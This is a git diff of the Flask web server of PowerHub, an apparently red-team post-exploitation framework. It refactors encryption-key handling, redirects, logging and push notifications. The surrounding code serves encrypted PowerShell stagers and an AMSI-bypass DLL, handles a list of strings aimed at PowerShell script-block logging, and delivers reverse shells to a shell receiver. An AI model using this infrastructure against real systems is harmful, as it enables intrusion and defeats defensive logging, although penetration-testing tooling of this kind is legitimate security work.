@@ -1,65 +1,78 @@
+
 from base64 import b64encode
 from datetime import datetime
+import logging
 import os
 import shutil
 from tempfile import TemporaryDirectory
 
 from flask import Flask, render_template, request, Response, redirect, \
          send_from_directory, flash, make_response, abort
+
+from werkzeug.serving import WSGIRequestHandler, _log
+from werkzeug.middleware.proxy_fix import ProxyFix
+from flask_socketio import SocketIO  # , emit
 try:
     from flask_sqlalchemy import SQLAlchemy
 except ImportError:
-    print("You have unmet dependencies. The clipboard "
-          "won't be persistent. Consult the README.")
+    pass
 
-from werkzeug.serving import WSGIRequestHandler, _log
-from flask_socketio import SocketIO  # , emit
-
+from powerhub.settings import init_settings
 from powerhub.clipboard import init_clipboard
 from powerhub.stager import modules, stager_str, callback_url, \
         import_modules, webdav_url
 from powerhub.upload import save_file, get_filelist
-from powerhub.directories import UPLOAD_DIR, BASE_DIR, XDG_DATA_HOME
-from powerhub.tools import encrypt, compress, key
+from powerhub.directories import UPLOAD_DIR, BASE_DIR, DB_FILENAME
+from powerhub.tools import encrypt, compress, get_secret_key
 from powerhub.auth import requires_auth
 from powerhub.repos import repositories, install_repo
 from powerhub.obfuscation import symbol_name
 from powerhub.receiver import ShellReceiver
 from powerhub.args import args
+from powerhub.logging import log
+from powerhub._version import __version__
 
-import logging
-log = logging.getLogger(__name__)
-
-_db_filename = os.path.join(XDG_DATA_HOME, "powerhub_db.sqlite")
 
 app = Flask(__name__)
+app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1, x_port=1)
 app.config.update(
     DEBUG=args.DEBUG,
     SECRET_KEY=os.urandom(16),
-    SQLALCHEMY_DATABASE_URI='sqlite:///' + _db_filename,
+    SQLALCHEMY_DATABASE_URI='sqlite:///' + DB_FILENAME,
+    SQLALCHEMY_TRACK_MODIFICATIONS=False,
 )
+
 try:
     db = SQLAlchemy(app)
 except NameError:
     db = None
+init_settings(db)
 cb = init_clipboard(db=db)
+KEY = get_secret_key()
 
 socketio = SocketIO(
     app,
     async_mode="threading",
 )
 
+if not args.DEBUG:
+    logging.getLogger("socketio").setLevel(logging.WARN)
+    logging.getLogger("engineio").setLevel(logging.WARN)
+
 need_proxy = True
 need_tlsv12 = (args.SSL_KEY is not None)
 
 
-def push_notification(type, msg, title, subtitle=""):
+def push_notification(type, msg, title, subtitle="", **kwargs):
+    arguments = {
+        'msg': msg,
+        'title': title,
+        'subtitle': subtitle,
+        'type': type,
+    }
+    arguments.update(dict(**kwargs)),
     socketio.emit('push',
-                  {
-                      'msg': msg,
-                      'title': title,
-                      'subtitle': subtitle,
-                  },
+                  arguments,
                   namespace="/push-notifications")
 
 
@@ -67,9 +80,16 @@ shell_receiver = ShellReceiver(push_notification=push_notification)
 
 
 class MyRequestHandler(WSGIRequestHandler):
-    def log(self, type, message, *args):
+    def address_string(self):
+        if 'x-forwarded-for' in dict(self.headers._headers):
+            return dict(self.headers._headers)['x-forwarded-for']
+        else:
+            return self.client_address[0]
+
+    def log(self, type, message, *largs):
         # don't log datetime again
-        _log(type, '%s %s\n' % (self.address_string(), message % args))
+        if " /socket.io/?" not in largs[0] or args.DEBUG:
+            _log(type, '%s %s\n' % (self.address_string(), message % largs))
 
 
 def run_flask_app():
@@ -82,10 +102,24 @@ def run_flask_app():
     )
 
 
+@app.template_filter()
+def debug(msg):
+    if args.DEBUG:
+        return msg
+    return ""
+
+
+@app.template_filter()
+def nodebug(msg):
+    if not args.DEBUG:
+        return msg
+    return ""
+
+
 @app.route('/')
 @requires_auth
 def index():
-    return redirect('//%s:%s/hub' % (args.URI_HOST, args.URI_PORT))
+    return redirect('/hub')
 
 
 @app.route('/hub')
@@ -97,6 +131,8 @@ def hub():
         "modules": modules,
         "repositories": list(repositories.keys()),
         "SSL": args.SSL_KEY is not None,
+        "AUTH": args.AUTH,
+        "VERSION": __version__,
     }
     return render_template("hub.html", **context)
 
@@ -110,6 +146,8 @@ def receiver():
                              need_tlsv12=need_tlsv12),
         "SSL": args.SSL_KEY is not None,
         "shells": shell_receiver.active_shells(),
+        "AUTH": args.AUTH,
+        "VERSION": __version__,
     }
     return render_template("receiver.html", **context)
 
@@ -119,6 +157,8 @@ def receiver():
 def clipboard():
     context = {
         "clipboard": list(cb.entries.values()),
+        "AUTH": args.AUTH,
+        "VERSION": __version__,
     }
     return render_template("clipboard.html", **context)
 
@@ -128,6 +168,8 @@ def clipboard():
 def fileexchange():
     context = {
         "files": get_filelist(),
+        "AUTH": args.AUTH,
+        "VERSION": __version__,
     }
     return render_template("fileexchange.html", **context)
 
@@ -157,7 +199,8 @@ def add_clipboard():
         str(datetime.utcnow()).split('.')[0],
         request.remote_addr
     )
-    return redirect('//%s:%s/clipboard' % (args.URI_HOST, args.URI_PORT))
+    push_notification("reload", "Update Clipboard", "")
+    return redirect('/clipboard')
 
 
 @app.route('/clipboard/delete', methods=["POST"])
@@ -203,9 +246,9 @@ def payload_m():
     if n < len(modules):
         modules[n].activate()
         if 'c' in request.args:
-            resp = b64encode(encrypt(compress(modules[n].code), key)),
+            resp = b64encode(encrypt(compress(modules[n].code), KEY)),
         else:
-            resp = b64encode(encrypt(modules[n].code, key)),
+            resp = b64encode(encrypt(modules[n].code, KEY)),
         return Response(
             resp,
             content_type='text/plain; charset=utf-8'
@@ -225,12 +268,12 @@ def payload_0():
         "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",  # noqa
         "EnableScriptBlockLogging",
     ]
-    encrypted_strings = [b64encode(encrypt(x.encode(), key)).decode() for x
+    encrypted_strings = [b64encode(encrypt(x.encode(), KEY)).decode() for x
                          in encrypted_strings]
     context = {
         "modules": modules,
         "callback_url": callback_url,
-        "key": key,
+        "key": KEY,
         "strings": encrypted_strings,
         "symbol_name": symbol_name,
         "stage2": 'r' if 'r' in request.args else '1',
@@ -255,7 +298,7 @@ def payload_1():
                     "payload.ps1",
                     **context,
     ).encode()
-    result = b64encode(encrypt(result, key))
+    result = b64encode(encrypt(result, KEY))
     return Response(result, content_type='text/plain; charset=utf-8')
 
 
@@ -267,7 +310,7 @@ def payload_l():
     filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
     with open(filename, 'rb') as f:
         DLL = f.read()
-    DLL = b64encode(encrypt(b64encode(DLL), key))
+    DLL = b64encode(encrypt(b64encode(DLL), KEY))
     return Response(DLL, content_type='text/plain; charset=utf-8')
 
 
@@ -289,11 +332,11 @@ def upload():
             return redirect(request.url)
         if file:
             save_file(file)
+    push_notification("reload", "Update Fileexchange", "")
     if noredirect:
-        return ""
+        return ('OK', 200)
     else:
-        return redirect('//%s:%s/fileexchange' %
-                        (args.URI_HOST, args.URI_PORT))
+        return redirect('/fileexchange')
 
 
 @app.route('/d/<path:filename>')
@@ -333,7 +376,7 @@ def get_repo():
     )
     # possible types: success, info, danger, warning
     flash(msg, msg_type)
-    return redirect('//%s:%s/hub' % (args.URI_HOST, args.URI_PORT))
+    return redirect('/hub')
 
 
 @app.route('/reload', methods=["POST"])
@@ -358,12 +401,14 @@ def reverse_shell():
         "delay": 10,  # delay in seconds
         "lifetime": 3,  # lifetime in days
         "PORT": str(args.REC_PORT),
+        "key": KEY,
+        "symbol_name": symbol_name,
     }
     result = render_template(
                     "reverse-shell.ps1",
                     **context,
     ).encode()
-    result = b64encode(encrypt(result, key))
+    result = b64encode(encrypt(result, KEY))
     return Response(result, content_type='text/plain; charset=utf-8')
 
 
@@ -411,6 +456,13 @@ def shell_kill_all():
     for shell in shell_receiver.active_shells():
         shell.kill()
     return ""
+
+
+@app.route('/receiver/shellcard', methods=["GET"])
+def shell_card():
+    shell_id = request.args["shell-id"]
+    shell = shell_receiver.get_shell_by_id(shell_id)
+    return render_template("receiver-shellcard.html", s=shell)
 
 
 @socketio.on('connect', namespace="/push-notifications")
